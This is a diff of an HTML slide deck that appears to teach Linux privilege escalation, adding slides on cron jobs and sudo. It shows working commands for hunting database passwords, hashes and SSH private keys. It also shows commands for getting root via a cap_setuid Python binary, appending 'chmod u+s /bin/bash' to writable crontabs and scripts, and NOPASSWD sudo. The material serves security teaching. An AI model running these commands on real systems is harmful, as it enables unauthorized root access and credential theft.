@@ -116,14 +116,14 @@
 							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="3">Credentials/SSH Keys Leakage</li>
 							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="4">File Permissions</li>
 							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="5">SUID, SGID</li>
-							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="7">Capability</li>
-							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="6">Cronjob</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="6">Capability</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="7">Cronjob</li>
 							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="8">Sudo</li>
 							<ul class="fragment" data-fragment-index="9">
 								<li style="font-size: 0.5em;">NOPASSWD</li>
-								<li style="font-size: 0.5em;">secure_path</li>
 								<li style="font-size: 0.5em;">dangerous binaries</li>
 								<li style="font-size: 0.5em;">env_keep (PATH, PYTHONPATH, LD_PRELOAD)</li>
+								<li style="font-size: 0.5em;">secure_path, env_reset</li>
 							</ul>
 							<li style="font-size: 0.7em; color: rgb(150, 212, 231);"  class="fragment" data-fragment-index="10">
 								<div class="fragment highlight-red grow" data-fragment-index="11">
@@ -169,7 +169,7 @@
 					</section>
 
 					<section class="text-left">
-						<p>databases</p>
+						<p class="fragment">databases</p>
 
 						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
 							mysql -u app_user -p'password' -e "SELECT username,password FROM mysql.users" 2>/dev/null
@@ -191,7 +191,7 @@
 					</section>
 
 					<section class="text-left">
-						<p>hashes (.htpasswd, shadow file, db backups, ...)</p>
+						<p class="fragment">hashes (.htpasswd, shadow file, db backups, ...)</p>
 						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
 							$ grep -r -i -E "(password|passwd|pwd|md5|sha1|sha256|sha512|bcrypt|scrypt|PBKDF2)[=:]['\"]?[0-9a-f]{32,128}['\"]?" /var/www/backups/ 2>/dev/null
 
@@ -210,7 +210,7 @@
 					</section>
 
 					<section class="text-left">
-						<p>Look for SSH Keys (.ssh | id_rsa)</p>
+						<p class="fragment">Look for SSH Keys (.ssh | id_rsa)</p>
 						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-5|5">
 							$ find / 2>/dev/null | grep -i '/\.ssh|id_rsa'
 							/home/user/.ssh
@@ -221,7 +221,7 @@
 					</section>
 
 					<section class="text-left">
-						<p>Look for ssh key format</p>
+						<p class="fragment">Look for ssh key format</p>
 						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-9|9">
 							$ for f in $(find / 2>/dev/null | grep -i '/\.ssh'); do
 								grep -r 'PRIVATE KEY' $f; 
@@ -241,7 +241,7 @@
 					<p style="color: rgb(150, 212, 231);">File Permissions</p>
 
 					<section class="text-left">
-						<p>Look for writable files/dirs</p>
+						<p class="fragment">Look for writable files/dirs</p>
 						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
 							$ find / -perm /g=w,o=w 2>/dev/null
 
@@ -340,7 +340,7 @@
 					</section>
 
 					<section class="text-left">
-						Find all capabilities in binaries
+						<p class="fragment">Find all capabilities in binaries</p>
 						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-5|2">
 							$ getcap -r / 2>/dev/null
 							/usr/bin/python3.11 cap_setuid=ep
@@ -351,7 +351,7 @@
 					</section>
 
 					<section class="text-left">
-						Exploitation
+						<p class="fragment">Exploitation</p>
 						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-9|7-9">
 							$ python3
 							Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linux
@@ -362,6 +362,134 @@
 							┌─[root@parrot]─[~/suid_sgid]
 							└──╼ #id
 							uid=0(root) gid=1000(user) groups=1000(user),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),106(netdev),110(lpadmin),114(bluetooth),116(scanner)
+						</code></pre>
+					</section>
+
+				</section>
+
+				<section>
+					<p style="color: rgb(150, 212, 231);">CronJob</p>
+					<section class="text-left">
+						<p>System-wide vs User-specific Cron Jobs</p>
+						<table class="bordered-table">
+							<thead>
+							<tr>
+								<th class="fragment" data-fragment-index="1">Location</th>
+								<th class="fragment" data-fragment-index="1">Scope</th>
+								<th class="fragment" data-fragment-index="1">Editing Method</th>
+								<th class="fragment" data-fragment-index="1">Path</th>
+							</tr>
+							</thead>
+							<tbody style="font-size: 0.5em;">
+							<tr>
+								<td class="fragment" data-fragment-index="2"><strong>System Crontab</strong></td>
+								<td class="fragment" data-fragment-index="2">All users</td>
+								<td class="fragment" data-fragment-index="2">Edit <code>/etc/crontab</code> directly</td>
+								<td class="fragment" data-fragment-index="2"><code>/etc/crontab</code></td>
+							</tr>
+							<tr>
+								<td class="fragment" data-fragment-index="3"><strong>User Crontabs</strong></td>
+								<td class="fragment" data-fragment-index="3">Per-user</td>
+								<td class="fragment" data-fragment-index="3">Use <code>/etc/crontab</code></td>
+								<td class="fragment" data-fragment-index="3"><code>/var/spool/cron/crontabs/username</code></td>
+							</tr>
+							<tr>
+								<td class="fragment" data-fragment-index="4"><strong>Cron Directories</strong></td>
+								<td class="fragment" data-fragment-index="4">System/User</td>
+								<td class="fragment" data-fragment-index="4">Use <code>Drop scripts in <code>.d</code> folders</code></td>
+								<td class="fragment" data-fragment-index="4"><code>/etc/cron.d/</code></td>
+							</tr>
+
+							<!-- Additional rows with fragments -->
+							</tbody>
+						</table>
+					</section>
+
+					<section class="text-left">
+						<p>Writable crontabs</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-4|4">
+							$ find /etc/cron* -perm /g=w,o=w 2>/dev/null
+							/etc/crontab
+
+							$ echo '* * * * * root chmod u+s /bin/bash' >> /etc/crontab
+						</code></pre>
+
+					</section>
+
+					<section class="text-left">
+						<p>Writable cron jobs scripts</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-4|1-2|4-5|7-8|10|12-14">
+							$ cat /etc/crontab  | grep -vE "^#"
+							* * * * * root /var/www/backup.sh
+
+							$ ls -la /var/www/backup.sh 
+							-rwxrwxr-x 1 root user 64 Apr  8 17:44 /var/www/backup.sh
+							
+							$ groups
+							user dialout cdrom floppy sudo audio dip video plugdev netdev lpadmin bluetooth scanner
+
+							$ echo 'chmod u+s /bin/bash' >> /var/www/backup.sh && sleep 60
+							</code></pre>
+
+					</section>
+					
+				</section>
+
+				<section>
+					<p style="color: rgb(150, 212, 231);">Sudo</p>
+
+					<section class="text-left">
+						<p class="fragment">NOPASSWD</p>
+						<p class="fragment">dangerous commands</p>
+						<p class="fragment">env_keep</p>
+						<ul>
+							<ul class="fragment">
+								<li>PATH</li>
+								<li>PYTHONPATH</li>
+								<li>LD_PRELOAD</li>
+							</ul>
+						</ul>
+						<p class="fragment">secure_path, env_reset</p>
+
+					</section>
+
+					<section class="text-left">
+						<p class="fragment">NOPASSWD</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-14|7|9-10|12-14|">
+							┌─[user@parrot]─[~]
+							└──╼ $sudo -l
+							Matching Defaults entries for user on parrot:
+								env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, editor=/usr/bin/nvim, use_pty
+
+							User user may run the following commands on parrot:
+								(ALL) NOPASSWD: ALL
+
+							┌─[user@parrot]─[~]
+							└──╼ $sudo bash
+
+							┌─[root@parrot]─[/home/user]
+							└──╼ #id
+							uid=0(root) gid=0(root) groups=0(root)
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						<p class="fragment">Dangerous Commands</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+							$ sudo -l
+							Matching Defaults entries for sudo0 on parrot:
+								mail_badpass, editor=/usr/bin/nvim, use_pty
+	
+							User sudo0 may run the following commands on parrot:
+								(ALL) NOPASSWD: /usr/bin/vi
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						<p class="fragment">env_keep + PATH</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-14|7|9-10|12-14|">
+							
+						</code></pre>
 					</section>
 
 				</section>
